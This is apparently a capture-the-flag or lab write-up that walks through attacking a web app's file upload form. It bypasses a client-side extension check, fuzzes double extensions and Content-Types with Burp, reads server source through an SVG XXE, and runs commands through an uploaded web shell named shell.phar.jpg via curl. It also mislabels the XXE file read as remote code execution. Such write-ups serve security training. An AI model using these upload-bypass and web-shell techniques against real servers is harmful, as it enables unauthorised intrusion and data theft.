# Background:

We've been hired to test the security of a web app. In particular, we'll be looking for file upload forms and try to exploit them.


# Recon:

As we start to look around we'll notice that the site is very early stage as most buttons don't take us anywhere. However if we click in "Contact Us" it will take us to the upload form at:

    http://154.57.164.71:31679/contact/

If we open devtools, go to the Network tab and read script.js, we'll find a basic blacklisting
 function:

    function checkFile(File) {
      var file = File.files[0];
      var filename = file.name;
      var extension = filename.split('.').pop();
    
      if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
        $('#upload_message').text("Only images are allowed");
        File.form.reset();
      } else {
        $("#inputGroupFile01").text(filename);
      }
    }
    
    $(document).ready(function () {
      $("#upload").click(function (event) {
        event.preventDefault();
        var fd = new FormData();
        var files = $('#uploadFile')[0].files[0];
        fd.append('uploadFile', files);
    
        if (!files) {
          $('#upload_message').text("Please select a file");
        } else {
          $.ajax({
            url: '/contact/upload.php',
            type: 'post',
            data: fd,
            contentType: false,
            processData: false,
            success: function (response) {
              if (response.trim() != '') {
                $("#upload_message").html(response);
              } else {
                window.location.reload();
              }
            },
          });
        }
      });
    });

- The "extension" variable selects the last extention in the string, so if we give it pic.svg.png, extension = .png


## Testing the file upload:

Lets upload a .jpg and see what happens:

<p align="center">
    <img width="524" height="912" alt="sc-upload_pic" src="https://github.com/user-attachments/assets/ea26bd83-3e62-47a4-9214-a5c14993172a" />
</p>

Notice that the green button allows us to test if the image can be uploaded without needing to fill out the form, lets use test out how restrictive it is for different file extentions.

- Note:

  This report uses a POST request for fuzzing, Firefox sent GET requests, but by switching to Librewolf and then testing the file upload button we could then interception POST requests.

  Also, it is highly recommended that you keep a unmodifyied copy of the request we used to upload pic.jpg. In the later stages of this attack a mistake in the syntax in your requests can cause the server to block your next request even when using corrected request syntax, this can be reset by going back and resending out original request.

  - And for multiple mistakes, you may need to create a copy of the original request anc send the copy to reset the server.

   Additionally, make sure to not encode the payloads:

    <p align="center">
        <img width="538" height="126" alt="sc-pl_encode" src="https://github.com/user-attachments/assets/59e75291-7ca3-4364-8a2e-a67664aee7b3" />
    </p>


Lets further investigate the upload functionality and see if we can find a way around the file restrictions.

We'll strat by uploading a .jpg and use Burp Suite to add an extention before the image type. Lets use the wordlist: /usr/share/seclists/Discovery/Web-Content/web-extensions.txt

        ------geckoformboundary1c3064ee08fbac913b71e2f796f8229c
        Content-Disposition: form-data; name="uploadFile"; filename="pic$ext$.png"
        Content-Type: image/png


After fuzzing, we can find the successful uploads by looking at the longest the Responces: 

<p align="center">
    <img width="1920" height="1045" alt="sc-fuzz-ext" src="https://github.com/user-attachments/assets/6798589a-7f47-48ce-a527-eddf8ad5306d" />

</p>

- We can see that the website allows us to upload a .phar.jpg, this potentially could be exploited in a way that allows us to upload and execute php scripts!


Now lets determine what content-types are acceptable, well make a custom wordlist with only image types:

    cat /usr/share/seclists/Discovery/Web-Content/web-all-content-types.txt | grep image/ > wl-webcontent.txt

- We can now test out the Content-Type parameter.

        ------geckoformboundary1c3064ee08fbac913b71e2f796f8229c
        Content-Disposition: form-data; name="uploadFile"; filename="pic.png"
        Content-Type: $ct$

<p align="center">
    <img width="1920" height="1045" alt="sc-fuzz-ct" src="https://github.com/user-attachments/assets/2b3dbb9e-387e-4314-b51c-defc2c1d1f9d" />
</p>


# Attack:

Now that we've determined what parameters can get through the upload filter, lets exploit the vulnerabilities.

Because image/svg+xml was an accepted Content-Type, lets see if we can use an XXE attack to read a file on the server thats not supposed to be exposed.

<p align="center">
    <img width="1920" height="1045" alt="sc-read_file" src="https://github.com/user-attachments/assets/8f754b72-cfb4-4527-9934-a55b0c657a38" />
</p>

- As we see, we've got a Remote Code Execution exploit!


Next, lets insepct the upload file to see if we can find where its storing the files:

<p align="center">
    <img width="1920" height="1045" alt="sc-read_sc" src="https://github.com/user-attachments/assets/72122f72-e945-457e-8ed2-81e2493baa2a" />
</p>

- If we decode the base64 string we get:

<p align="center">
    <img width="668" height="286" alt="sc-soursecode_upload" src="https://github.com/user-attachments/assets/bd228775-b329-4bc2-b085-967e328ee996" />
</p>

- From this, we can determine the naming convention for an uplodaed file:

      http://ip:port/contact/user_feedback_submissions/YearMonthDay_filename.jpg


Now that we know how to find the files, lets upload a shell:

<p align="center">
    <img width="1920" height="1045" alt="sc-upload_shell" src="https://github.com/user-attachments/assets/4fe3dfeb-a05d-4052-8e6a-a2842df7cc2d" />
</p>

- As we can see the upload was successful!


First thing we should do is test out the shell by listing the contents of the root directory:

    curl -X POST http://154.57.164.71:31679/contact/user_feedback_submissions/260719_shell.phar.jpg -d "cmd=ls /" --output results.txt; cat results.txt

From the output we see that the flag is titled:

    flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt

We can now get the flag with:

    curl -X POST http://154.57.164.71:31679/contact/user_feedback_submissions/260719_shell.phar.jpg -d "cmd=cat /flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt" --output results.txt; cat results.txt
